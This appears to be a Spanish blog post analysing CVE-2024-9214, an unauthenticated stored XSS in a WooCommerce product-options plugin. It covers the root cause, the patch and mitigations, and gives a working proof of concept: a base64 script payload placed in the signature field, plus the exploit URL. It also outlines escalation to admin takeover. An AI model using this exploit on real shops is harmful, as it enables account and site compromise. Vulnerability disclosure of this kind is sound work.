---
title: "CVE-2024-9214: Unauth Stored XSS en Extra Product Options Builder for WooCommerce"
date: 2024-10-25
author: Aitor F.
description: Análisis técnico de CVE-2024-9214, un XSS almacenado sin autenticación en Extra Product Options Builder for WooCommerce.
isStarred: false
draft: true
toc: true
tags: ["infosec", "cve", "xss", "wordpress", "woocommerce"]
# Ficha de la vulnerabilidad. Se renderiza como tabla resumen al principio del
# post (layouts/_partials/vuln-summary.html) y alimenta el JSON-LD de schema.html.
cve: "CVE-2024-9214"
product: "Extra Product Options Builder for WooCommerce"
affected: "<= 1.2.133"
fixed: "1.2.134"
cvss: "6.1 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)"
advisory: "https://www.wordfence.com/threat-intel/vulnerabilities/id/09890f42-b9ee-4812-8cf2-f638ba9fb20f"
---

## TL;DR

CVE-2024-9214 es un XSS almacenado en Extra Product Options Builder for WooCommerce hasta la versión 1.2.133 que permite a un atacante sin autenticar guardar un fichero HTML en el servidor a través del campo de firma y ejecutar JavaScript en el dominio de la tienda cuando alguien lo abre.

## Contexto

[Extra Product Options Builder for WooCommerce](https://wordpress.org/plugins/additional-product-fields-for-woocommerce/) (slug `additional-product-fields-for-woocommerce`, de RedNao) es un plugin de WordPress que permite añadir campos personalizados a los productos de una tienda WooCommerce: textos, selectores, subida de ficheros, fórmulas de precio… Uno de esos tipos de campo es **Signature**, un canvas en el que el cliente firma antes de añadir el producto al carrito.

El navegador convierte ese dibujo en un PNG codificado en base64 (`data:image/png;base64,...`) y lo manda al servidor junto con el resto de campos, que lo decodifica, lo guarda en disco y lo enlaza desde el carrito y desde el pedido.

En este post vamos a ver que el plugin no comprobaba que la firma fuese una imagen, y que el endpoint que la sirve decide el `Content-Type` mirando el contenido del fichero. Juntando las dos cosas, cualquiera puede alojar una página HTML arbitraria en el dominio de la tienda.

Todo el código que aparece es de la versión 1.2.133 ([r3164437](https://plugins.trac.wordpress.org/browser/additional-product-fields-for-woocommerce/trunk?rev=3164437)), la última vulnerable.

## Causa raíz

### Escritura de la firma

Cuando se añade un producto al carrito, el formulario de WooCommerce incluye un parámetro `RednaoSerializedFields` con un JSON que contiene el valor de cada campo. El plugin lo procesa en el filtro `woocommerce_add_cart_item_data` ([`WooStagesManager.php`](https://plugins.trac.wordpress.org/browser/additional-product-fields-for-woocommerce/trunk/core/Managers/WooStagesManager.php?rev=3164437#L465)):

```php
public function AddCartItemData($cart_item_meta, $product_id){
    if(isset($_POST['RednaoSerializedFields']))
    {
        $data=\json_decode(\stripslashes($_POST['RednaoSerializedFields']));
        // ...
        $form=new FormBuilder($this->Loader,$options,$data,$product);
        $form->Initialize();
        $lineItems=$form->GenerateLineItems();
        // ...
    }
    return $cart_item_meta;
}
```

`GenerateLineItems()` recorre los campos y llama a `GetLineItems()` en cada uno. En el caso de la firma ([`FBSignature.php`](https://plugins.trac.wordpress.org/browser/additional-product-fields-for-woocommerce/trunk/core/Managers/FormManager/Fields/FBSignature.php?rev=3164437#L23)), el valor se pasa directamente al gestor de ficheros:

```php
public function GetLineItems(){
    if($this->Entry==null||$this->GetEntryValue('Value','')==='')
        return array();

    $fileManager=new FileManager($this->Loader);
    $this->Entry->Path=$fileManager->TemporaryUploadSignature($this->GetEntryValue('Value',''));
    // ...
}
```

Y [`TemporaryUploadSignature()`](https://plugins.trac.wordpress.org/browser/additional-product-fields-for-woocommerce/trunk/core/Managers/FileManager/FileManager.php?rev=3164437#L159) quita el prefijo `data:image/...;base64,` si lo hay, decodifica lo que queda y lo escribe en la carpeta temporal con extensión `.png`:

```php
public function TemporaryUploadSignature($signature)
{
    $tempDir=$this->GetTempFolderRootPath();
    $fileName=uniqid("",true).'.png';
    $fileName=wp_unique_filename($tempDir,$fileName);

    $data = base64_decode( preg_replace( '#^data:image/\w+;base64,#i', '', $signature ) );
    $save_signature = file_put_contents( $tempDir.$fileName, $data );

    return $tempDir.$fileName;
}
```

En ningún momento se comprueba que lo decodificado sea un PNG, ni siquiera una imagen. Lo que mandemos en `Fields[n].Value` acaba tal cual en `wp-content/uploads/rednaowooextraproduct/temp/<uniqid>.png`.

Esto, por sí solo, no sería suficiente. La carpeta `temp/` se crea con un `.htaccess` que contiene `deny from all`, así que en Apache no se puede pedir el fichero directamente. Y aunque se pudiera (en nginx el `.htaccess` no se aplica), el servidor lo serviría como `image/png` por la extensión y el navegador no lo interpretaría como HTML. El problema completo aparece al ver cómo lo sirve el propio plugin.

### Lectura de la firma

Para mostrar la firma en el carrito, el plugin la enlaza a través de un endpoint AJAX ([`OrderDesignerAjax.php`](https://plugins.trac.wordpress.org/browser/additional-product-fields-for-woocommerce/trunk/ajax/OrderDesignerAjax.php?rev=3164437#L20)) registrado como público y sin nonce:

```php
protected function RegisterHooks()
{
    $this->RegisterPrivate('getfileupload','GetFileUpload');
    $this->RegisterPublic('getpublicfileupload','GetFileUpload',false);
    // ...
}
```

`RegisterPublic()` lo registra tanto en `wp_ajax_` como en `wp_ajax_nopriv_`, y el tercer parámetro (`false`) desactiva la validación del nonce. Es decir, cualquiera puede llamar a `admin-ajax.php?action=rednaowooextraproduct_getpublicfileupload` y descargar un fichero de `temp/` o de `OrderFiles/` si conoce su nombre.

```php
public function GetFileUpload(){
    if(!isset($_GET['path']))
        $this->SendErrorMessage('Invalid operation');

    $path=sanitize_file_name(basename(\strval($_GET['path'])));
    $name=$_GET['name'];
    if($name=='signature')
        $name='signature.png';
    $manager=new FileManager($this->Loader);

    if(isset($_GET['temp']))
    {
        $baseDir=$manager->GetTempFolderRootPath();
    }else
        $baseDir=$manager->GetOrderFolderRootPath();
    $realPath=$baseDir.$path;
    // ...
    header('Content-Disposition: '.($name=='signature.png'?'inline':'attachment').'; filename="'.$name.'"');
    header('Content-Type: '.\mime_content_type($realPath));

    header('Content-Length: ' . filesize($realPath));
    readfile($realPath);
    exit;
}
```

El `basename()` y el `sanitize_file_name()` evitan el path traversal, pero hay dos detalles que son los que hacen que el fichero se ejecute:

- **`Content-Type` a partir del contenido:** `mime_content_type()` usa libmagic, que identifica el tipo leyendo los primeros bytes del fichero e ignora la extensión. Un fichero que empieza por `<script>` se detecta como `text/html` aunque se llame `.png`.

- **`Content-Disposition: inline` para las firmas:** si `name` es `signature`, el fichero se sirve para mostrarlo en el navegador en vez de como descarga.

Así que el navegador recibe una respuesta `text/html`, inline, desde `https://<target>/wp-admin/admin-ajax.php`, y la renderiza como una página más del sitio.

El problema de fondo es que el plugin confía en que el campo de firma siempre lo rellena su propio lienzo. La única validación de que es un PNG está en el JavaScript del cliente, y el servidor, en vez de imponer el tipo que espera (`image/png`), le pregunta al fichero qué es.

## Alcance

Para explotarlo hace falta al menos un producto con un campo de tipo **Signature**. Nada más. Añadir al carrito no requiere cuenta, y el endpoint de lectura es público. El nombre del fichero (`uniqid()`) no es necesario adivinarlo, porque el propio carrito del atacante muestra el enlace.

### Impacto

El JavaScript se ejecuta en el origen de la tienda, así que tiene acceso a todo lo que tiene acceso el usuario que abre el enlace en ese dominio. Hace falta que la víctima abra el enlace, pero no es complicado: es una URL del propio dominio de la tienda, sin nada raro a la vista, que se le puede mandar a un administrador por el formulario de contacto o el chat de soporte ("no se ve bien la firma de mi pedido, ¿podéis mirarlo?").

Si la abre un administrador con la sesión iniciada, el script puede hacer peticiones a `/wp-admin/` con sus cookies y leer las respuestas, porque es el mismo origen. Con eso puede sacar los nonces que necesite y, por ejemplo, crear un usuario administrador, o editar un plugin o un tema desde el editor del panel, que en la práctica supone ejecución de código en el servidor. Las cookies de sesión de WordPress son `HttpOnly`, pero tampoco hace falta robarlas.

## Explotación

La petición de añadir al carrito es la del formulario normal del producto. Lo único que nos interesa es el parámetro `RednaoSerializedFields`, que con una firma legítima tiene esta forma:

```json
{"Fields":[{"Label":"Signature","Id":1,"Type":"signature","GlobalId":null,"PriceType":"fixed_amount","Price":24,"SalePrice":0,"Quantity":1,"UnitPrice":24,"Value":"data:image/png;base64,iVBORw0KGgo[...]"}],"PreviousCartKey":"","Totals":{"ProductPrice":0,"OptionsTotal":24,"GrandTotal":24,"OptionsUnitPrice":24}}
```

Para explotarlo, basta con interceptar o repetir esa petición sustituyendo `Fields[0].Value` por el HTML que queramos, codificado en base64. Por ejemplo:

```console
~$ printf '<script>alert(document.domain);</script>' | base64
PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOzwvc2NyaXB0Pg==
```

```json
{"Fields":[{"Label":"Signature","Id":1,"Type":"signature","GlobalId":null,"PriceType":"fixed_amount","Price":24,"SalePrice":0,"Quantity":1,"UnitPrice":24,"Value":"data:image/png;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOzwvc2NyaXB0Pg=="}],"PreviousCartKey":"","Totals":{"ProductPrice":0,"OptionsTotal":24,"GrandTotal":24,"OptionsUnitPrice":24}}
```

El producto se añade al carrito sin problemas. En la página del carrito, la sección *Signature* del producto enlaza al fichero generado:

```text
https://<target>/wp-admin/admin-ajax.php?action=rednaowooextraproduct_getpublicfileupload&path=66e45c77379f13.93740556.png&name=signature&temp=true
```

Al abrir ese enlace se ejecuta el `alert(document.domain)`. El fichero queda en el servidor y el enlace es válido para cualquiera que lo abra.

## Análisis del parche

La corrección está en el [changeset 3173169](https://plugins.trac.wordpress.org/changeset/3173169/), publicado como versión 1.2.134. El cambio relevante está en `FBSignature::GetLineItems()`, que ahora valida el valor antes de escribirlo:

```php
$value=$this->GetEntryValue('Value','');
if(!$this->IsValidBase64Image($value)){
    throw new \Exception('Invalid signature image');
}
```

```php
private function IsValidBase64Image($data) {
    // Check if the data matches the data:image/png;base64 format
    if (preg_match('/^data:image\/png;base64,/', $data)) {
        // Remove the data:image/png;base64, part
        $data = substr($data, strpos($data, ',') + 1);

        // Decode the base64 string
        $decodedData = base64_decode($data, true);

        // Check if the decoded data is valid
        if ($decodedData !== false) {
            // Create an image resource from the decoded data
            $image = imagecreatefromstring($decodedData);

            // Check if the image resource is valid
            if ($image !== false) {
                // Free up memory
                imagedestroy($image);
                return true;
            }
        }
    }
    return false;
}
```

Ahora se exige el prefijo `data:image/png;base64,`, se decodifica en modo estricto y se comprueba con GD que el contenido sea una imagen que se pueda abrir. Algunos detalles:

- `imagecreatefromstring()` acepta cualquier formato que soporte GD (PNG, JPEG, GIF, WebP, BMP…), no solo PNG, así que la comprobación del prefijo es más bien cosmética. Aun así, lo importante es que el contenido sea una imagen válida, y una imagen válida empieza por sus *magic bytes*, con lo que libmagic la va a identificar como `image/*` y no como `text/html`. Un políglota PNG con HTML dentro de un chunk de texto se serviría como `image/png`, y los navegadores no interpretan como HTML una respuesta `image/*`.
- `TemporaryUploadSignature()` y `GetFileUpload()` no cambian en este parche. El endpoint sigue decidiendo el `Content-Type` a partir del contenido y sirviendo las firmas inline, así que la protección depende por completo de la validación al escribir. Es suficiente para este vector, pero si en el futuro otro camino escribiese en `temp/` u `OrderFiles/` sin validar, volvería a ser explotable.
- La validación se hace antes de escribir nada, así que una firma inválida no deja ningún fichero en disco: se lanza una excepción y el producto no se añade al carrito.

Bastante después, en la 1.2.176 ([r3626182](https://plugins.trac.wordpress.org/changeset/3626182/), julio de 2026), el endpoint se reforzó por su cuenta: las descargas públicas exigen un token HMAC ligado al fichero (y, en los temporales, a la sesión de WooCommerce de quien lo subió), se resuelven las rutas con `realpath()`, y se añaden las cabeceras `X-Content-Type-Options: nosniff` y `Cache-Control: private, no-store`.

## Mitigación

- Actualizar el plugin a la versión 1.2.134 o superior.
- Si no se puede actualizar, quitar temporalmente los campos de tipo *Signature* de los productos evita el vector, aunque el endpoint seguiría sirviendo los ficheros que ya existan.
- Revisar `wp-content/uploads/rednaowooextraproduct/temp/` y `OrderFiles/` en busca de ficheros `.png` que no sean imágenes, por si se ha explotado antes de actualizar.

## Cronología

- **13/09/2024:** reporte inicial.
- **21/10/2024:** publicación de la versión 1.2.134 con la mitigación.
- **23/10/2024:** publicación del advisory de Wordfence.
- **24/10/2024:** publicación de CVE-2024-9214.

## Referencias

- [CVE-2024-9214](https://www.cve.org/CVERecord?id=CVE-2024-9214)
- [Wordfence: Extra Product Options Builder for WooCommerce <= 1.2.133 - Unauthenticated Stored Cross-Site Scripting](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/additional-product-fields-for-woocommerce/extra-product-options-builder-for-woocommerce-12133-unauthenticated-stored-cross-site-scripting)
- [Extra Product Options Builder for WooCommerce en WordPress.org](https://wordpress.org/plugins/additional-product-fields-for-woocommerce/)
